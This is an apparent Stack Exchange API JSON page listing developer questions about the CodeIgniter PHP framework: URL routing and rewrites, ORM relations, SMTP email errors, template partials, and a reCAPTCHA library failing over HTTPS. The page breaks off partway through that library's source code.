{"total":13987,"page":20,"pagesize":100,"questions":[{"tags":[".htaccess","codeigniter","routes","rewrite","codeigniter-2"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12291157,"title":"Codeigniter htaccess and routing for a SEO controller name in urls","body":"<p>I'm having a controller named : main_controller\nall the links in my app refers to it with url like : <code>/main_controller/...</code></p>\n\n<p>Now i want to insert some <strong>SEO</strong> in all this and change the url to a more seo one like <code>/seo_name_for_controller/...</code></p>\n\n<p>Instead of doing a full manual search &amp; replace for all occurences which may be source of errors, I wish i could do this using <strong>htaccess</strong> with something like :</p>\n\n<pre><code>RewriteRule ^/main_controller/(.*)$ /seo_name_for_controller/$1 [L,R=301]\n</code></pre>\n\n<p>Then using <strong>routes.php</strong> to finish the process like :</p>\n\n<pre><code>$route['seo_name_for_controller/(:any)'] = \"main_controller/$1\";\n</code></pre>\n\n<p>Is it possible or will it cause an infinite loop ? does someone have a code example for this ?</p>\n"},{"tags":["php","codeigniter","html-encode"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":822,"score":1,"question_id":1485691,"title":"How to add html_entity_decode to array?","body":"<p>I am making a content entry with TinyMCE in codeigniter.\nHowever the output source is like the following and does not show &lt; and >. Instead it shows HTML enties like &lessthan; and &greaterthan;  etc. </p>\n\n<p>The entry is made by admin after logged in. </p>\n\n<p>Output comes from database.</p>\n\n<p>I took out escape in model, but it still does the same thing.</p>\n\n<p>Also I have a config setting, $config['global_xss_filtering'] = FALSE;</p>\n\n<p>So I want to add html_entity_decode. But the $page_data is an array. \nThe array has id, title, content and slug which is used for page item.</p>\n\n<p>Could anyone tell me how to do it please?</p>\n\n<p><hr /></p>\n\n<p>Output example:</p>\n\n<pre><code>&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;images/icon1.png&amp;quot; border=&amp;quot;0&amp;quot;\nalt=&amp;quot;icon&amp;quot; width=&amp;quot;48&amp;quot; height=&amp;quot;48&amp;quot; /&amp;gt;\nLorem ipsum dolor sit amet, consectetur adipiscing elit.\n</code></pre>\n\n<p><hr /></p>\n\n<p>Model code:</p>\n\n<pre><code>&lt;?php\n\nclass Pagemodel extends Model \n{\n....\n...\n\n/** \n* Return an array of a page — used in the front end\n*\n* @access public\n* @param string\n* @return array\n*/\nfunction fetch($slug)\n{\n\t$query = $this-&gt;db-&gt;query(\"SELECT * FROM `pages` WHERE `slug` = '$slug'\");\n\treturn $query-&gt;result_array();\n}\n\n\n...\n...\n\n}\n\n?&gt;\n</code></pre>\n\n<p>Controller code:</p>\n\n<pre><code>function index()\n{\n\t$page_slug = $this-&gt;uri-&gt;segment('2'); // Grab the URI segment\n\n\tif($page_slug === FALSE)\n\t{\n\t\t$page_slug = 'home';\n\t}\n\n$page_data = $this-&gt;pages-&gt;fetch($page_slug); // Pull the page data from the database\n\n\tif($page_data === FALSE)\n\t{\n\t\tshow_404(); // Show a 404 if no page exists\n\t}\n\telse\n\t{\n\t\t$this-&gt;_view('index', $page_data[0]);\n\t}\n}\n</code></pre>\n"},{"tags":["codeigniter","orm","datamapper"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12282866,"title":"code igniter datamapper orm model inheritance with related objects","body":"<p>I'm working with DataMapper ORM in Codeigniter 2.1.2:</p>\n\n<p>I have this kind of entities:</p>\n\n<pre><code>Person\n-id             PRIMARY KEY\n-name\n-lastname\n-age\n\nStudent\n-person_id      PRIMARY KEY\n-college\n-notebook_color\n-other attribute\n\nAddress\n-id             PRIMARY KEY\n-street\n-number\n-person_id\n</code></pre>\n\n<p>NOTE: Student has no own PK. It uses Person's ID as PK.</p>\n\n<p>So my problem is. I want to create a student:</p>\n\n<pre><code>$student = new Student();\n$student-&gt;get_by_person_id($id);\n</code></pre>\n\n<p>I want <code>$student</code> to have all the data from <code>person</code>, including the addesses. I tried using include_related() to bring the fields from <code>person</code>, but this doesn't bring the objects related.\nI would like my <code>$student</code> look like:</p>\n\n<pre><code>$student                  -&gt;id\n                          -&gt;name\n                          -&gt;lastname\n                          -&gt;age\n                          -&gt;college\n                          -&gt;notebook_color\n                          -&gt;other_attribute\n                          -&gt;address (array)\n                             [0]    -&gt; id\n                                    -&gt; street\n                                    -&gt; number\n\n                             [1]    -&gt; id\n                                    -&gt; street\n                                    -&gt; number\n</code></pre>\n\n<p>How can I get this to work?</p>\n"},{"tags":["php","email","codeigniter","smtp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":401,"score":0,"question_id":10723404,"title":"mediatemple - can't send email using codeigniter","body":"<p>I can't send emails using mediatemple in codeigniter.I've checked the email password and smtp host and they are correct.</p>\n\n<p>This is the error:</p>\n\n<pre><code>Severity: Notice\n\nMessage: fwrite() [function.fwrite]: send of 12 bytes failed with errno=10054 An existing connection was forcibly closed by the remote host.\n\nFilename: libraries/Email.php\n\nLine Number: 1846\n</code></pre>\n\n<p>This is my code:\nI have replaced sxxxxx.gridserver.com with my correct smtp.</p>\n\n<pre><code>function _sendEmail($from,$fromname,$to,$subject,$message){\n            $config = array(\n            'protocol' =&gt; 'smtp',\n            'smtp_host' =&gt; 'sxxxxx.gridserver.com',\n            'smtp_port' =&gt; 465,\n            'smtp_user' =&gt; 'noreply@mywebsite.com',\n            'smtp_pass' =&gt; 'mypass'\n        );\n\n\n        $this-&gt;load-&gt;library('email',$config);\n        $this-&gt;email-&gt;set_newline(\"\\r\\n\");\n\n        $this-&gt;email-&gt;from($from,$fromname);\n        $this-&gt;email-&gt;to($to);\n        $this-&gt;email-&gt;subject($subject);\n        $this-&gt;email-&gt;message($message);\n        $this-&gt;email-&gt;send();\n    }\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n\n<p><strong>Edit : I have fixed this problem using port 25.</strong></p>\n"},{"tags":["php","jquery","codeigniter","query-string"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12305802,"title":"parse_str randomly adding semicolons to keys","body":"<p>I am passing a query string as part of my query string to a PHP script.</p>\n\n<p>Kinda like this:</p>\n\n<pre><code>$.post('/url', {\n    id: postID\n    filters: $('#form').serialize()\n});\n</code></pre>\n\n<p>Then in my PHP, I use <code>parse_str</code> to read <code>filters</code>:</p>\n\n<pre><code>&lt;?php\n$postID = $this-&gt;input-&gt;post('id');\nparse_str($this-&gt;input-&gt;post('filters'), $filters);\n</code></pre>\n\n<p>The problem is that <code>parse_str</code> is adding <code>;</code>s randomly to the keys.  I'm getting a result like this:</p>\n\n<pre><code>array(4) {\n  [\"users\"]=&gt;\n  string(0) \"\"\n  [\"companies;\"]=&gt;\n  string(0) \"\"\n  [\"pref;_123\"]=&gt;\n  string(0) \"\"\n  [\"products;\"]=&gt;\n  array(2) {\n    [0]=&gt;\n    string(4) \"1234\"\n    [1]=&gt;\n    string(4) \"5678\"\n  }\n}\n</code></pre>\n\n<p>Why is the server adding <code>;</code>?  I tried it on another server, and this doesn't happen.  It also doesn't happen when testing via CLI.</p>\n\n<p><strong>EDIT</strong>: Seems this is not <code>parse_str</code>'s fault, but some sort of XSS filter.  <code>$this-&gt;input-&gt;post('filters')</code> (and even <code>$_POST['filters']</code>!) contains the <code>;</code> characters.  I checked, and jQuery is not adding them.</p>\n\n<p><strong>EDIT</strong>: I managed to \"fix\" this by doing:</p>\n\n<pre><code>$filters = array_combine(array_map(function($x){\n    return str_replace(';', '', $x);\n}, array_keys($filters)), array_values($filters));\n</code></pre>\n"},{"tags":["php","apache",".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12306637,"title":"Using mod_rewrite to pass requests to CodeIgniter in a subfolder","body":"<p>I'm trying to pass requests from the root of my url to a subfolder without redirecting using mod_rewrite. (Note: I'm doing this on Rackspace Cloud Sites.)</p>\n\n<p>I took the CI .htaccess, moved it up to the root folder, and changed it from this:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|public|robots\\.txt)\nRewriteRule ^(.*)$ /ci/index.php/$1 [L]\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|public|robots\\.txt)\nRewriteBase /ci/\nRewriteRule ^(.*)$ /ci/index.php/$1 [L]\n</code></pre>\n\n<p>Which gives me an internal server error. I don't believe this sort of this has an error log, which is probably why I've always considered mod_rewrite to be alchemy.</p>\n\n<p>Maybe you can see what's going wrong?</p>\n\n<p>Thanks! </p>\n"},{"tags":["javascript","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12302757,"title":"codeigniter - form's action property - how to specify full app path in javascript","body":"<p>i have the following javascript in my view: </p>\n\n<pre><code>  $.ajax({\n    url:\"&lt;?php echo site_url('switches/showknownvlans/'.$ip.'/'.$hardwaremodel);?&gt;\",\n    type:'POST',\n    dataType:'json',\n    success: function(returnDataFromController) {\n    //alert(returnDataFromController.length);\n    var htmlstring;\n    var submitFormHTML;\n    htmlstring = \"some html stuff\";\n\n    for(i = 0; i &lt; returnDataFromController.length; i++) {\n\n    }\n    submitFormHTML = \"&lt;form method='post' accept-charset='utf-8' action='controllerX/methodABC/\"+ $('#ip').val() +\"/\" + $('#hardwaremodel').val() +\"/\" + $('#port').val() + \"'&gt;&lt;input type='text' id='newVlanID' style='width:5em;height:1.5em'/&gt;&amp;nbsp;&amp;nbsp;&lt;button type='submit' class='btn' id='saveVlan' style='width:10em;height:2em'&gt;Reassign Vlan&lt;/button&gt;&lt;/form&gt;\";\n    alert(submitFormHTML);\n    $('#clientajaxcontainer').html(htmlstring);\n    $('#newvlanform').html(submitFormHTML);\n</code></pre>\n\n<p>The path that I currently have defined for my form's \"action\" property in the \"submitFormHTML\" string is incorrect.  Instead of taking my user to \"http://myserver/myapp/controllerX/methodABC/\" with all the parameters, its appending \"controllerX/methodABC/\" to the end of the current URL. \nso if the user is at:</p>\n\n<pre><code> http://myserver/mypp/controller23/method123/\n</code></pre>\n\n<p>when the click on the button to submit the form, they end up at: </p>\n\n<pre><code> http://myserver/mypp/controller23/method123/controllerX/methodABC/\n</code></pre>\n\n<p>Is there a way to get either the site_url() or base_url in javascript?\nAny suggestions?  Thanks for reading the post.</p>\n\n<p>Edit: </p>\n\n<p>As per someone's suggestion (I think it's a good idea) I've create a new .js file called \"global.js\" and I have one line in it: </p>\n\n<pre><code>var BASEPATH = \"&lt;?php echo base_url(); ?&gt;\";\n</code></pre>\n\n<p>This file is then included in my template PHP file for my view like so: </p>\n\n<pre><code>&lt;!DOCTYPE html&gt; &lt;!-- aka HTML5 --&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n\n\n&lt;link href=\"&lt;?php echo base_url();?&gt;assets/css/bootstrap.css\" rel=\"stylesheet\"&gt;\n    &lt;script type='text/javascript' src='&lt;?php echo base_url();?&gt;assets/js/global.js' charset=\"utf-8\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>I've modified my javascript that craetes the form to look like: \n        submitFormHTML = \"&nbsp;&nbsp;Reassign Vlan\";\n        alert(submitFormHTML);</p>\n\n<p>Edit2: </p>\n\n<p>What's interesting is that when I define BASEPATH in the global.js, the URL my javascript ends up generating looks like this: </p>\n\n<pre><code> http://myserver/myapp/index.php/switches/showportvlan/parm1/parm2/%3C?php%20echo%20base_url%28%29;?%3E/index.php/switches/changeportvlan/parm1/parm2/parm3. \n</code></pre>\n\n<p>As you can see, instead of interpretting the \"\", it just included the text as is. </p>\n\n<p>But if i forget including a separate js file and just do this: \n      \n     \n     \n      </p>\n\n<pre><code>&lt;link href=\"&lt;?php echo base_url();?&gt;assets/css/bootstrap.css\" rel=\"stylesheet\"&gt;\n    &lt;script type='text/javascript'&gt;\n         var BASEPATH=\"&lt;?php echo base_url();?&gt;\";\n     &lt;/script&gt;\n</code></pre>\n\n<p>it works just fine. </p>\n\n<p>I can't see why the include file fails.</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":167,"score":0,"question_id":12069249,"title":"getUser() always return 0 in Codeigniter","body":"<p>I started to create a small application using codeigniter framework \nand i have dowloaded Facebook connect from github after creating my application inside facebook, at this moment all  work alright my only problem is getUser() always return 0 </p>\n\n<p>i have create a facebook.php inside <code>application/config/</code>\nalse i have extracting <code>facebook.php &amp; base_facebook.php</code> inside <code>application/libraries/</code></p>\n\n<p>this is my code </p>\n\n<pre><code>class Welcome extends CI_Controller {\n\n    private $data = array();\n\n\n\n    public function index() {\n        $this-&gt;data['loginUrl'] = $this-&gt;facebook-&gt;getLoginUrl();\n        $this-&gt;data['userId'] = $this-&gt;facebook-&gt;getUser();\n        $this-&gt;load-&gt;view('welcome_message', $this-&gt;data);\n    }\n\n}\n</code></pre>\n\n<p>in autoload \ni have :</p>\n\n<pre><code>$autoload['libraries'] = array('database','session','facebook'); \n</code></pre>\n\n<p>so why <code>getUser()</code> return 0 and how can i fix this problem \nthx</p>\n"},{"tags":["php","mysql","query","codeigniter","activerecord"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12253216,"title":"CodeIgniter Active Records Help needed","body":"<p>I am trying to find out the latest image uploaded in each of the category of a website from the data base where the structure of the database is :</p>\n\n<p>tbl_cat : cat_id, cat_name, noi (no. of total images in that cat)\ntbl_img : img_id, cat_id, img_path, imag_caption </p>\n\n<p>Any idea how can I do it using active records. I would also love to understand it with sql query. I know its lame, but I am just starting. Sorry about that.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12282346,"title":"Codeigniter dynamic routes","body":"<p>In my CI application I have a few controllers to handle different user-type functions:</p>\n\n<ol>\n<li>CA </li>\n<li>CD  </li>\n<li>DV</li>\n<li>CSC</li>\n<li>CB</li>\n</ol>\n\n<p>So currently when someone logs in, he is redirected by his role to (example) : <code>localhost/CA</code> or <code>localhost/CD</code> etc..</p>\n\n<p>I need to rewrite the routes to redirect everything depending on his role:</p>\n\n<p><code>$route['(:any)'] = 'CA/$1';</code>   (CA should not be hardcoded)</p>\n\n<ul>\n<li>The rule should also be removed when using the login Controller (by filtering some url's)</li>\n</ul>\n\n<p>Can anyone show me how to hook the rules after login? and also how to use a regexp to filter some url on which to apply the rules? </p>\n\n<pre><code>$route['^((?!auth/).)*$'] = '$1';\n</code></pre>\n\n<p>What other way would be to achieve this? .htaccess is out of the question since I need some data logic to create the routes. </p>\n"},{"tags":["php","codeigniter","activerecord","updatemodel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":119,"score":0,"question_id":12301691,"title":"Codeigniter Update database: echo data back in input fields and update on submit","body":"<p>I am developing my skills using the Codeigniter framework. I have already viewed and inserted data into the database and finding it more tricky to update data. Most tutorials i've saw are inputting the values in the code rather than pulling a selected id from the database and echoing in form fields. So far i have:</p>\n\n<p>news_model:</p>\n\n<pre><code>function editArticle($data) {\n        $data = array(\n                       'title' =&gt; $title,\n                       'content' =&gt; $content,\n                       'author' =&gt; $author\n                    );\n\n        $this-&gt;db-&gt;where('id', $id);\n        $this-&gt;db-&gt;update('news', $data, array('id' =&gt;$id));\n\n    }\n</code></pre>\n\n<p>Controller:</p>\n\n<pre><code>    public function update_entry() {\n        //load the upate model\n        $this-&gt;load-&gt;model('update_model');\n\n        //get the article from the database\n        $data['news'] = $this-&gt;news_model-&gt;get_article($this-&gt;uri-&gt;segment(4));\n\n        // perform validation on the updated article so no errors or blank fields\n        $this-&gt;load-&gt;library('form_validation');\n\n        $this-&gt;form_validation-&gt;set_rules('title', 'Title', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('content', 'Content', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('author', 'Author', 'trim|required');\n\n        // If validation fails, return to the edit screen with error messages\n        if($this-&gt;form_validation-&gt;run() == FALSE) {\n\n            $this-&gt;index();\n\n        }else{\n            //update the news article in the database\n            if($query = $this-&gt;update_model-&gt;update()) {\n\n        }else{\n            redirect('admin/edit');\n        }\n    }\n}\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>        &lt;?php echo form_open('admin/edit/edit_article'); ?&gt;\n\n        &lt;?php echo form_input('title', set_value('title', 'Title')); ?&gt;&lt;br /&gt;\n        &lt;?php echo form_textarea('content', set_value('content', 'Content')); ?&gt;&lt;br /&gt;\n        &lt;?php echo form_input('author', set_value('author', 'Author')); ?&gt;\n        &lt;?php echo form_submit('submit', 'Edit Article'); ?&gt;\n        &lt;?php if (isset($error)){echo \"&lt;p class='error'&gt;$error&lt;/div&gt;\";\n        }?&gt;\n        &lt;?php echo validation_errors('&lt;p class=\"error\"&gt;' );?&gt;\n         &lt;?php echo form_close(); ?&gt; \n</code></pre>\n\n<p>1) Im not sure how to echo the data out (from when the user has clicked the edit button from the article view shown) to grab that id, and then display on the edit page in the text fields.</p>\n\n<p>2) And then for the user to then submit the updated data and post in the database?</p>\n\n<p>Any guidance or help with structuring the rest of my controller/view files would be appreciated as ive been on this for more than a day!</p>\n\n<p>Thank You.</p>\n"},{"tags":["codeigniter","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12301386,"title":"Codeigniter route expression","body":"<p>I am trying to dynamically change the routes depending on the user-role. So I have a cache routes.php which I write to when the user logs in. Anyway, I need some url's not to be rerouted:</p>\n\n<p>For now I have:  <code>$route['(:any)']='CA/$1';</code> which works fine on any url. </p>\n\n<p>I need all the URI's that start with <code>auth</code> or <code>rest</code> to be left aside as the first one is the login controller and the second one is the subfolder with controllers used by JQgrids. I have tried this but with no result:</p>\n\n<pre><code>$route['^(?!auth|rest).*'] = \"CA/$1\";\n</code></pre>\n\n<p>Edit: \n@Vlakarados</p>\n\n<p>Your routes are currently working but I have the following problem:</p>\n\n<p>My <code>routes.php</code> looks like this:</p>\n\n<pre><code>$route['404_override'] = '';\n$route['default_controller'] = \"auth\";\n\ninclude_once(APPPATH.\"cache/routes.php\");\n</code></pre>\n\n<p>In the Auth controller I do the following:</p>\n\n<pre><code>class Auth extends CI_Controller {\n    function Auth() {\n        parent::__construct();\n    }\n    function index()\n    {\n        if ($this-&gt;ion_auth-&gt;logged_in())\n        {\n            $this-&gt;__checkRoles();\n        }\n        else\n        {\n                        //render the form\n            }\n    }\n\n    function logout()\n    {\n        session_start();\n        session_unset();\n        session_destroy();\n        $logout = $this-&gt;ion_auth-&gt;logout();\n        redirect('auth');\n    }\n    function __checkRoles()\n    {\n\n        $role=$this-&gt;ion_auth-&gt;get_group();\n        $this-&gt;save_routes($role);\n        switch ($role) {\n\n            case 'CA':\n                redirect(base_url()); //this is how I'm redirecting now, because it will route to base_url()/CA (but it won't because first it will route to default_controller which is 'Auth'\n                break;\n            case 'CD':\n                redirect(base_url().'CD'); //this is how I used to redirect,\n                break;\n            case 'DV':\n                redirect(base_url().'DV');\n                break;\n            case 'AC':\n                redirect(base_url().'AC');\n                break;\n\n            case 'Admin':\n                redirect(base_url().'Admin');\n                break;\n            default:\n                show_404();\n                break;\n        }\n    }\n    public function save_routes($controller=null)\n    {\n            $output=\"&lt;?php \";\n            $output.=\"\\$route['auth']='auth';\";     \n            $output.=\"\\$route['rest']='rest';\";\n            $output.=\"\\$route['(:any)']='\".$controller.\"/$1';\";\n\n            $this-&gt;load-&gt;helper('file');\n            write_file(APPPATH . \"cache/routes.php\", $output);\n            $string = read_file('./path/to/file.php');\n    }\n}\n</code></pre>\n\n<p><strong>Solved:</strong></p>\n\n<p>I've worked this around by not redirecting to base_url() and expecting <code>base_url().'/CA'</code> which of course led to <code>base_url().'/CA/index'</code> but directly redirecting to <code>base_url().'/index'</code></p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12301941,"title":"Is there any way to loop through uri segments in codeignitor?","body":"<p>I was wondering if there is a way to loop through all the uri segments in a URL...</p>\n\n<p>/segment1/segment2/segment3/</p>\n\n<p>Is it possible to loop through these with a foreach loop?</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","forms","codeigniter","file-upload","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12299502,"title":"Adding Video and Image upload to form in codeigniter","body":"<p>This is more of an abstract question than a specific coding issue.</p>\n\n<p>I have a facebook app built using codeigniter. It's essentially just for data capture. The user completes a form that is stored in a database. </p>\n\n<p>However, On the form there is the option to upload a video with their submission or upload an image. Neither of the two are compulsory, just the text fields, such as name, email etc.</p>\n\n<p>My question is what is the best way to go about this? Does the user upload their video and or image before they click submit. Or on submit do i upload what ever is in the file fields? </p>\n\n<p>Thanks</p>\n"},{"tags":["mysql","codeigniter","multilingual","translator"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12297329,"title":"Use existing MySQL database in CodeIgniter","body":"<p>In my PHP websites I’m using <a href=\"http://sourceforge.net/projects/sitetranslator/\" rel=\"nofollow\">SiteTranslator</a> script for a website translated into 30 languages. Each translation is stored in its own table (text_en, text_de...) and each table has 3 columns (textKey, textValue, lastUpdate).</p>\n\n<p>Now I would like to use that database in my CodeIgniter application.\nWhat would be the best way to do it?</p>\n"},{"tags":["php","codeigniter","templates","redirect","partials"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12251715,"title":"Problems reading data from Codeigniter Template Partials, and with controller redirection","body":"<p>I have two unrelated Codeigniter problems:</p>\n\n<p>(a) I am trying to redirect a user to the dashboard after logging in successfully. i.e. from controller \"auth\" to controller \"dashboard\". For some odd reason, it keeps redirecting to auth/dashboard (404 error since it does not exist).</p>\n\n<p>This is what I did:</p>\n\n<pre><code>//Within the auth controller    \n    if ($this-&gt;auth-&gt;login($username, $password)) //Auth-&gt;login returns boolean\n    {\n    redirect('/dashboard', 'refresh');\n    # redirect('/dashboard', 'location');  // I tried this too\n    # redirect('/dashboard/index', 'refresh');   // I also tried this!\n    }\n</code></pre>\n\n<p>What am I doing wrong, please? It just keeps redirecting to auth/dashboard</p>\n\n<p>(b) I am using Phil Sturgeon's brilliant Codeigniter Template library (without a Parser) and I am unable to receive data sent into a partials file. This data is ONLY needed by the partials file. I have been over the (unfortunately sparse) library documentation, S/O posts on the topic, and also the CI forums to no avail, there seems to be no clear-cut example showing how a partial receives data that a controller assigns to it.</p>\n\n<p>This is how I have been doing it. Please tell me what I must be doing wrong.</p>\n\n<pre><code>// In the controller page\n$this-&gt;data['user'] = array('info' =&gt; 'username', 'value' =&gt; 'Cogicero');\n$this-&gt;data['prefs'] = array('foo' =&gt; 'bar');\n$this-&gt;template\n     -&gt;set_partial('header', 'partials/header', $this-&gt;data)\n     -&gt;set_layout('blog')\n     -&gt;build('foobar_view');\n</code></pre>\n\n<p>And</p>\n\n<pre><code>        //In the header partials page\n        &lt;?php\n        /* snip */\n        print_r($data);\n        print_r($prefs);\n        print_r($user);\n        echo $user[\"info\"];\n        echo $prefs[\"foo\"];\n        ?&gt;\n</code></pre>\n\n<p>All the above produce \"array does not exist\" or \"undefined variable\" errors! How am I meant to be receiving data within the partials view file?</p>\n\n<p>Thanks</p>\n\n<p><strong>EDIT:\nWorking on a tight deadline so with no solution in sight, I had to abandon Phil Sturgeon's template library and pick up Jens Segers' instead. <a href=\"http://www.jenssegers.be/blog/25/Codeigniter-template-library\" rel=\"nofollow\">http://www.jenssegers.be/blog/25/Codeigniter-template-library</a>\nIt is a little similar to Phil's but for some reason the partials are receiving and rendering my data properly. Also, Sergers' template library is very well documented. All is fine now, so I'll accept my own answer to problem (a). Thanks everyone.</strong></p>\n"},{"tags":["php","codeigniter","recaptcha"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":139,"score":0,"question_id":12015814,"title":"Recaptcha not working on https","body":"<p>i have a site in codeigniter,and that site working perfectly on <code>http</code>.</p>\n\n<p>My client moved the site to <code>https</code>.</p>\n\n<p>Then now when user registration is not working ,because there have a recaptcha used in it.</p>\n\n<p>Now it displays <code>Could not open socket</code> error.</p>\n\n<p>this is the recaptcha calling in my controller:</p>\n\n<pre><code>$privatekey = \"my-key\";\n        $resp = recaptcha_check_answer ($privatekey,\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n        if (!$resp-&gt;is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n            die (\"The reCAPTCHA wasn't entered correctly\");\n        }else{\n\n            $data=$this-&gt;authmodel-&gt;addAccount();\n            $this-&gt;session-&gt;set_flashdata('abc', 'User added successfully'); \n            echo \"1\";\n        }\n</code></pre>\n\n<p>And this is the recaptchalib.php code:</p>\n\n<pre><code>&lt;?php\n/*\n * This is a PHP library that handles calling reCAPTCHA.\n *    - Documentation and latest version\n *          http://recaptcha.net/plugins/php/\n *    - Get a reCAPTCHA API Key\n *          https://www.google.com/recaptcha/admin/create\n *    - Discussion group\n *          http://groups.google.com/group/recaptcha\n *\n * Copyright (c) 2007 reCAPTCHA -- http://recaptcha.net\n * AUTHORS:\n *   Mike Crawford\n *   Ben Maurer\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n/**\n * The reCAPTCHA server URL's\n */\ndefine(\"RECAPTCHA_API_SERVER\", \"http://www.google.com/recaptcha/api\");\ndefine(\"RECAPTCHA_API_SECURE_SERVER\", \"https://www.google.com/recaptcha/api\");\ndefine(\"RECAPTCHA_VERIFY_SERVER\", \"www.google.com\");\n\n/**\n * Encodes the given data into a query string format\n * @param $data - array of string elements to be encoded\n * @return string - encoded request\n */\nfunction _recaptcha_qsencode ($data) {\n        $req = \"\";\n        foreach ( $data as $key =&gt; $value )\n                $req .= $key . '=' . urlencode( stripslashes($value) ) . '&amp;';\n\n        // Cut the last '&amp;'\n        $req=substr($req,0,strlen($req)-1);\n        return $req;\n}\n\n\n\n/**\n * Submits an HTTP POST to a reCAPTCHA server\n * @param string $host\n * @param string $path\n * @param array $data\n * @param int port\n * @return array response\n */\nfunction _recaptcha_http_post($host, $path, $data, $port = 80) {\n\n        $req = _recaptcha_qsencode ($data);\n\n        $http_request  = \"POST $path HTTP/1.0\\r\\n\";\n        $http_request .= \"Host: $host\\r\\n\";\n        $http_request .= \"Content-Type: application/x-www-form-urlencoded;\\r\\n\";\n        $http_request .= \"Content-Length: \" . strlen($req) . \"\\r\\n\";\n        $http_request .= \"User-Agent: reCAPTCHA/PHP\\r\\n\";\n        $http_request .= \"\\r\\n\";\n        $http_request .= $req;\n\n        $response = '';\n        if( false == ( $fs = @fsockopen($host, $port, $errno, $errstr, 10) ) ) {\n                die ('Could not open socket');\n        }\n\n        fwrite($fs, $http_request);\n\n        while ( !feof($fs) )\n                $response .= fgets($fs, 1160); // One TCP-IP packet\n        fclose($fs);\n        $response = explode(\"\\r\\n\\r\\n\", $response, 2);\n\n        return $response;\n}\n\n\n\n/**\n * Gets the challenge HTML (javascript and non-javascript version).\n * This is called from the browser, and the resulting reCAPTCHA HTML widget\n * is embedded within the HTML form it was called from.\n * @param string $pubkey A public key for reCAPTCHA\n * @param string $error The error given by reCAPTCHA (optional, default is null)\n * @param boolean $use_ssl Should the request be made over ssl? (optional, default is false)\n\n * @return string - The HTML to be embedded in the user's form.\n */\nfunction recaptcha_get_html ($pubkey, $error = null, $use_ssl = false)\n{\n    if ($pubkey == null || $pubkey == '') {\n        die (\"To use reCAPTCHA you must get an API key from &lt;a href='https://www.google.com/recaptcha/admin/create'&gt;https://www.google.com/recaptcha/admin/create&lt;/a&gt;\");\n    }\n\n    if ($use_ssl) {\n                $server = RECAPTCHA_API_SECURE_SERVER;\n        } else {\n                $server = RECAPTCHA_API_SERVER;\n        }\n\n        $errorpart = \"\";\n        if ($error) {\n           $errorpart = \"&amp;amp;error=\" . $error;\n        }\n        return '&lt;script type=\"text/javascript\" src=\"'. $server . '/challenge?k=' . $pubkey . $errorpart . '\"&gt;&lt;/script&gt;\n\n    &lt;noscript&gt;\n        &lt;iframe src=\"'. $server . '/noscript?k=' . $pubkey . $errorpart . '\" height=\"300\" width=\"500\" frameborder=\"0\"&gt;&lt;/iframe&gt;&lt;br/&gt;\n        &lt;textarea name=\"recaptcha_challenge_field\" rows=\"3\" cols=\"40\"&gt;&lt;/textarea&gt;\n        